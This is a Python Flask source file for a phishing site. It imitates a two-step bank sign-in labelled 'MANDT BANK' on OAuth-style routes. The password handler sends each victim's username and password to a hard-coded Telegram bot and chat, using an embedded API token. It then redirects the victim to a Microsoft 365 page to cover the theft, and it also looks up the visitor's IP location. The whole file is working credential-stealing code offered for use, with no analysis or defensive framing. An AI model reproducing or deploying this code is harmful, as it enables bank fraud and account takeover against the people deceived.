from urllib import response
from flask import Blueprint, session, render_template, request, redirect, url_for
# from .utils import send_login
from requests import get
import telebot

API_TOKEN = '5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY'

receiver_id = 1124454735

bot = telebot.TeleBot(API_TOKEN)

portals = Blueprint('portals', __name__)


@portals.route('/')
def syncing_():
    return redirect(url_for('portals.signin'))

@portals.route('/oauth/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        if user_id:
            session['username'] = user_id
            return redirect(url_for('portals.password'))
    return render_template('signin.html')

@portals.route('/signin/syncing', methods=['GET','POST'])
def syncing():
    return render_template('syncing.html')

@portals.route('/oauth/password', methods=['GET','POST'])
def password():
    response = get('http://ip-api.com/json')
    data = response.json()
    country = data['country']
    city = data['city']
    zipcode = data['zip']
    ip = data['query']
    username = session['username']
    if request.method == 'POST':
        password = request.form.get('password')
        if password:
            bot.send_message(receiver_id, f'-------------MANDT BANK-------------\nUsername: {username}\nPassword: {password}\n--------------------------')
            # send_login(username, password, country, city,zipcode,ip)
            return redirect('https://www.microsoft.com/en-us/microsoft-365/microsoft-office')
    return render_template('password.html', username=username)